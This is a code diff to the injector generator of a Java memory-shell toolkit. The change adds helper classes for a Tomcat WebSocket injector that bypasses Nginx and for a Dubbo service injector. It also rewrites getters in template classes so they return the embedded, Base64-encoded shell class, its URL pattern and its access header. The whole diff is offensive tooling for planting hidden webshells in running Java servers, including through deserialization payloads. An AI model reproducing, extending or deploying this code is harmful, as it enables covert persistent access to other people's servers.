@@ -13,6 +13,7 @@ import org.leo.jmg.ServletNamespace;
 import org.leo.jmg.generation.GenerationPlan;
 import org.leo.jmg.generation.GenerationRequest;
 import org.leo.jmg.generation.GenerationWorkspace;
+import org.leo.jmg.mem.helper.tomcat.TomcatWsBypassValve;
 import org.leo.jmg.util.base64.Base64Utils;
 import org.leo.jmg.util.javassist.JavassistUtil;
 
@@ -31,7 +32,9 @@ public class InjectorGenerator {
                 plan.isAbstractTranslet(),
                 workspace.getShellClassName(),
                 workspace.getShellClassBytes(),
-                request.getUrlPattern(),
+                createHelperClass(plan, workspace),
+                workspace.getEffectiveUrlPattern() == null
+                        ? request.getUrlPattern() : workspace.getEffectiveUrlPattern(),
                 request.getHeaderName(),
                 request.getHeaderValue(),
                 request.getEffectiveServletNamespace(),
@@ -69,18 +72,36 @@ public class InjectorGenerator {
             ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
         }
 
-        // 写入所有注入器都需要的静态字段。
-        JavassistUtil.replaceStaticField(ctClass, "shellClassName",
-                "private static String shellClassName = \"" + JavassistUtil.escapeJavaString(context.shellClassName) + "\";");
-        JavassistUtil.replaceStaticField(ctClass, "shellClass",
-                "private static String shellClass = \"" + JavassistUtil.escapeJavaString(Base64Utils.gzipAndBase64(context.shellClassBytes)) + "\";");
-        // Listener、Valve、Interceptor、Customizer 等全局挂载点没有 URL 字段。
-        JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "urlPattern",
-                "private static String urlPattern = \"" + JavassistUtil.escapeJavaString(context.urlPattern) + "\";");
+        // 部分注入器通过 getter 暴露三个生成占位符。保持模板原貌，
+        // 仅在生成阶段把返回值改写为本次构建的数据。
+        if (!replaceStringGetterIfDeclared(ctClass, "getClassName",
+                context.shellClassName)) {
+            JavassistUtil.replaceStaticField(ctClass, "shellClassName",
+                    "private static String shellClassName = \""
+                            + JavassistUtil.escapeJavaString(context.shellClassName) + "\";");
+        }
+        if (!replaceStringGetterIfDeclared(ctClass, "getBase64String",
+                Base64Utils.gzipAndBase64(context.shellClassBytes))) {
+            JavassistUtil.replaceStaticField(ctClass, "shellClass",
+                    "private static String shellClass = \""
+                            + JavassistUtil.escapeJavaString(
+                            Base64Utils.gzipAndBase64(context.shellClassBytes)) + "\";");
+        }
+        if (!replaceStringGetterIfDeclared(ctClass, "getUrlPattern", context.urlPattern)) {
+            JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "urlPattern",
+                    "private static String urlPattern = \""
+                            + JavassistUtil.escapeJavaString(context.urlPattern) + "\";");
+        }
+        if (context.helperClassBytes != null) {
+            replaceStringGetterIfDeclared(ctClass, "getHelperBase64String",
+                    Base64Utils.gzipAndBase64(context.helperClassBytes));
+        }
         JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "headerName",
-                "private static String headerName = \"" + JavassistUtil.escapeJavaString(context.headerName) + "\";");
+                "private static String headerName = \""
+                        + JavassistUtil.escapeJavaString(context.headerName) + "\";");
         JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "headerValue",
-                "private static String headerValue = \"" + JavassistUtil.escapeJavaString(context.headerValue) + "\";");
+                "private static String headerValue = \""
+                        + JavassistUtil.escapeJavaString(context.headerValue) + "\";");
 
         JavassistUtil.applyServletNamespace(ctClass, context.servletNamespace);
 
@@ -102,6 +123,87 @@ public class InjectorGenerator {
                     : bytes;
         } finally {
             ctClass.detach();
+        }
+    }
+
+    private byte[] createHelperClass(GenerationPlan plan,
+                                     GenerationWorkspace workspace) throws Exception {
+        GenerationRequest request = plan.getRequest();
+        if (request.getInjectorName().endsWith("DubboServiceInjector")) {
+            return createDubboServiceInterface(workspace, request.isShrink());
+        }
+        if (!"Tomcat".equalsIgnoreCase(request.getServerType())
+                || !"ByPassNginxWebSocketInjector".equals(request.getInjectorName())) {
+            return null;
+        }
+        String helperName = workspace.getShellClassName() + "$1";
+        String resource = "/" + TomcatWsBypassValve.class.getName()
+                .replace('.', '/') + ".class";
+        ClassPool pool = new ClassPool(null);
+        pool.appendSystemPath();
+        pool.insertClassPath(new ClassClassPath(TomcatWsBypassValve.class));
+        try (InputStream input = TomcatWsBypassValve.class.getResourceAsStream(resource)) {
+            if (input == null) {
+                throw new IllegalStateException("Cannot find WebSocket bypass helper template");
+            }
+            CtClass helper = pool.makeClass(input);
+            try {
+                helper.setName(helperName);
+                helper.getClassFile().setVersionToJava5();
+                JavassistUtil.replaceStaticField(helper, "headerName",
+                        "public static String headerName = \""
+                                + JavassistUtil.escapeJavaString(request.getHeaderName()) + "\";");
+                JavassistUtil.replaceStaticField(helper, "headerValue",
+                        "public static String headerValue = \""
+                                + JavassistUtil.escapeJavaString(request.getHeaderValue()) + "\";");
+                JavassistUtil.applyServletNamespace(helper,
+                        request.getEffectiveServletNamespace());
+                byte[] bytes = helper.toBytecode();
+                return request.isShrink()
+                        ? ClassFileMinimizer.transform(bytes) : bytes;
+            } finally {
+                helper.detach();
+            }
+        }
+    }
+
+    private byte[] createDubboServiceInterface(GenerationWorkspace workspace,
+                                                boolean shrink) throws Exception {
+        String shellName = workspace.getShellClassName();
+        int packageEnd = shellName.lastIndexOf('.');
+        String packageName = packageEnd < 0 ? "" : shellName.substring(0, packageEnd + 1);
+        String simpleName = packageEnd < 0 ? shellName : shellName.substring(packageEnd + 1);
+        ClassPool pool = new ClassPool(null);
+        pool.appendSystemPath();
+        CtClass helper = pool.makeInterface(packageName + "I" + simpleName);
+        try {
+            helper.getClassFile().setVersionToJava5();
+            helper.addMethod(CtNewMethod.abstractMethod(
+                    pool.get("byte[]"), "handle", new CtClass[]{pool.get("byte[]")},
+                    new CtClass[0], helper));
+            byte[] bytes = helper.toBytecode();
+            return shrink ? ClassFileMinimizer.transform(bytes) : bytes;
+        } finally {
+            helper.detach();
+        }
+    }
+
+    private void replaceStringGetter(CtClass ctClass,
+                                     String methodName,
+                                     String value) throws Exception {
+        CtMethod method = ctClass.getDeclaredMethod(methodName);
+        method.setBody("{ return \"" + JavassistUtil.escapeJavaString(value) + "\"; }");
+    }
+
+    private boolean replaceStringGetterIfDeclared(CtClass ctClass,
+                                                  String methodName,
+                                                  String value) throws Exception {
+        try {
+            replaceStringGetter(ctClass, methodName, value);
+            return true;
+        } catch (javassist.NotFoundException ignored) {
+            // Listener、Valve、Interceptor 等全局挂载点没有 URL 参数。
+            return false;
         }
     }
 
@@ -196,6 +298,7 @@ public class InjectorGenerator {
         private final boolean abstractTranslet;
         private final String shellClassName;
         private final byte[] shellClassBytes;
+        private final byte[] helperClassBytes;
         private final String urlPattern;
         private final String headerName;
         private final String headerValue;
@@ -208,6 +311,7 @@ public class InjectorGenerator {
                                         boolean abstractTranslet,
                                         String shellClassName,
                                         byte[] shellClassBytes,
+                                        byte[] helperClassBytes,
                                         String urlPattern,
                                         String headerName,
                                         String headerValue,
@@ -219,6 +323,7 @@ public class InjectorGenerator {
             this.abstractTranslet = abstractTranslet;
             this.shellClassName = shellClassName;
             this.shellClassBytes = shellClassBytes;
+            this.helperClassBytes = helperClassBytes;
             this.urlPattern = urlPattern;
             this.headerName = headerName;
             this.headerValue = headerValue;
